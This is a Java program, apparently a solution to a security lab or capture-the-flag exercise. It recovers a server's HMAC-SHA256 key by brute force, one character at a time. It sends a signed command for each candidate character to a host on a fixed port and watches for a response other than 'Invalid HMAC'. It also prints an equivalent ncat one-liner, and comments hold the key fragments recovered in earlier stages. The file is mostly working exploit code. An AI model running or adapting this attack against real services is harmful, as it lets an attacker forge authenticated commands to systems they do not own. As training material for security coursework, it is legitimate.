import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import javax.xml.bind.DatatypeConverter;
import java.io.*;
import java.net.Socket;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

public class BufferOverRun_FindKey {

    private static final int PORT = 38770;
    private static final int USER = 302115;
    private static final String CLIENT_TAG = "ClientCmd";
    private static final String ALPHABETS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789[ !#$£%&'()*+,-./\\:;<=>?@^_`{|}~\"ÄäÅåÖö¤¢¥¦§¨©ª«¬®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÅÆÇÈÉÊËÌÍÎÏ]";

    public static void main(String[] args) {
        try {
            char nullChar = '\0';
            String oneCharShortKey = "This is a dummy ke"; //Initial setup------
            //String oneCharShortKey = "This is a dummy";
            //String command = "aaa............................";//Initial setup------
            String command = "aaa......................."; // Only for last char
            for (char c : ALPHABETS.toCharArray()) {
                //String hMackey = "This is a dummy ke"+ nullChar + c; //Initial setup------
                //String hMackey = ""+ nullChar + c +"QXrApiLZRmVlpGnWWNu";
                //String hMackey = "This is a dummy "+ nullChar + c +"QJ";
                //String hMackey = ""+ nullChar + c+"YvI2QbqA4Oc3MO60qQJ";

                String hMackey =  c+ "QXrApiLZRmVlpGnWWNu"; //Only for last char

                String message = CLIENT_TAG + "|" + USER + "|" + command; // only for last char
                //String message = CLIENT_TAG + "|" + USER + "|" + command + oneCharShortKey;//Initial setup------

                Mac hasher = Mac.getInstance("HmacSHA256");

                hasher.init(new SecretKeySpec(hMackey.getBytes(), "HmacSHA256"));

                byte[] hash = hasher.doFinal(message.getBytes());
                String hexBin = DatatypeConverter.printHexBinary(hash);

                //telnetCode(command, oneCharShortKey, hexBin, c); //Initial setup----
                telnetCode(command, "", hexBin, c); //Only for last key
            }
        } catch (
                NoSuchAlgorithmException e) {
            System.out.println("NoSuchAlgorithmException" + e.getMessage());
        } catch (
                InvalidKeyException e) {
            System.out.println("InvalidKeyException" + e.getMessage());
        }

    }

    public static void telnetCode(String cmd, String oneCharShortKey, String hexBin, char c) {
        Socket pingSocket = null;
        PrintWriter out = null;
        BufferedReader in = null;
        try {
            pingSocket = new Socket("device1.vikaa.fi", PORT);
            out = new PrintWriter(pingSocket.getOutputStream(), true);
            in = new BufferedReader(new InputStreamReader(pingSocket.getInputStream()));
        } catch (IOException e) {
            System.out.println("IOException" + e.getMessage());
        }
        System.out.println("echo \"202233;" + cmd + oneCharShortKey + ";" + hexBin.toLowerCase() + "\" | ncat device1.vikaa.fi 35291");
        out.println(USER + ";" + cmd + oneCharShortKey + ";" + hexBin.toLowerCase());

        try {
            String readLines = in.readLine();
            if (!readLines.equals("Invalid HMAC. Command not accepted.")) {
                System.out.println(readLines);
                System.out.println(" -----lastchar:" + c);
                System.exit(0);
            } else {
                //System.out.println(" Testing one char with HashKey: " + c);
                //System.out.println(readLines);
            }
            out.close();
            in.close();
            pingSocket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    private static byte[] addLastTerminationByte(String input) throws UnsupportedEncodingException {
        //byte[] stringBytes=input.getBytes("ISO-8859-1");
        byte[] stringBytes = input.getBytes();
        byte[] ntBytes = new byte[input.length() + 1];
        System.arraycopy(stringBytes, 0, ntBytes, 0, stringBytes.length);
        return ntBytes;
    }
}
